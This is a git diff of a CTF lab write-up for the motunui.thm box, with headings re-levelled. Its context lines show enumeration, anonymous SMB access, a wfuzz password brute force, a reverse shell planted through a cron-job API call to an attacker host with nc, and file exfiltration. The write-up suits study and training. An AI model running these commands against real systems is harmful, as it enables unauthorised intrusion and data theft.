@@ -157,7 +157,7 @@ nmap -sC -sV -A 10.201.37.236
     Nmap done: 1 IP address (1 host up) scanned in 105.84 seconds\
 
 
-## Directory Bruteforcing
+### Directory Bruteforcing
 
 feroxbuster -u http://10.201.37.236 -w /usr/share/wordlists/dirb/common.txt
                                                                           
@@ -181,7 +181,7 @@ Just some raw javascript
 
     "http://10.201.37.236/javascript/async/async"
 
-## Smb enumeration
+### Smb enumeration
 
 smbclient -L //10.201.37.236 -N
 
@@ -211,11 +211,11 @@ smbclient //10.201.37.236/traces -N
     
     		19475088 blocks of size 1024. 11257912 blocks available
     smb: \> 
-## Finding in smb
+### Finding in smb
 
      maui/ticket_6746.pcapng
      
-## Analysting it with wireshark
+### Analysting it with wireshark
 
     We find a subdomain that hosts a virtual machine and its ip address http://192.168.236.130:8000/      dashboard.png
 
@@ -223,7 +223,7 @@ smbclient //10.201.37.236/traces -N
 
     10.201.37.236 d3v3lopm3nt.motunui.thm
 
-## Brute-forcing directories for enumerating d3v3lopm3nt.motunui.thm
+### Brute-forcing directories for enumerating d3v3lopm3nt.motunui.thm
 
 feroxbuster -u http://d3v3lopm3nt.motunui.thm -w /usr/share/wordlists/SecLists/Discovery/Web-Content/ DirBuster-2007_directory-list-2.3-medium.txt -t 75
                                                                                        
@@ -348,9 +348,9 @@ curl http://api.motunui.thm:3000/v1/login
     
     {"message":"please get maui to update these routes"}
 
-### Pentesting services
+## Pentesting services
 
-## Bruteforcing user maui:island
+### Bruteforcing user maui:island
 
 
 wfuzz -c -H 'Content-Type: application/json' -d '{"username":"maui","password":"FUZZ"}' -w /usr/share/wordlists/SecLists/Passwords/Leaked-Databases/rockyou-45.txt --hh 31 -t 50 http://api.motunui.thm:3000/v2/login
@@ -380,9 +380,9 @@ curl -H 'Content-Type: application/json' -d '{"username":"maui","password":"isla
     
     {"hash":"aXNsYW5k"}
 
-### Getting a Shell
+## Getting a Shell
 
-## Reverse shell
+### Reverse shell
 
 curl -H 'Content-Type: application/json' -d '{"hash":"aXNsYW5k","job":"* * * * * rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.6.48.108 4050 >/tmp/f"}' -XPOST http://api.motunui.thm:3000/v2/jobs 
 
@@ -395,7 +395,7 @@ nc -lvnp 4050
     /bin/sh: 0: can't access tty; job control turned off
     $ 
 
-## upgrading the shell
+### upgrading the shell
 
     python3 -c 'import pty; pty.spawn("/bin/bash")'
     ^Z
@@ -403,9 +403,9 @@ nc -lvnp 4050
     fg
     export TERM=xterm
 
-### Inside
+## Inside
 
-## enumerating files and directories
+### enumerating files and directories
 
     $ cat user.txt
     cat: user.txt: Permission denied
@@ -432,12 +432,12 @@ nc -lvnp 4050
     -rw-r--r-- 1 network network  807 Jul  7  2020 .profile
     drwxrwxr-x 5 network network 4096 Jul  9  2020 traces
 
-## Finding good files
+### Finding good files
 find / -type f -iname '*pkt' -ls 2>/dev/null
 
        926350     76 -rwxrwxrwx   1 moana    moana       75918 Jul  9  2020 /etc/network.pkt
 
-### Exciltration
+## Exciltration
 
 ## Sender
 
@@ -500,7 +500,7 @@ nc -lvnp 4545 > network.pkt
 
 ## Privilege escelation
 
-### We find in /etc/ssl.txt, with this we can fully decrypt the traffic of the wireshark pcap file we had
+We find in /etc/ssl.txt, with this we can fully decrypt the traffic of the wireshark pcap file we had
 
 tshark -r ticket_6746.pcapng -o "tls.keylog_file:ssl.txt" -Y "http || tls" -V > decrypted_traffic.txt
 
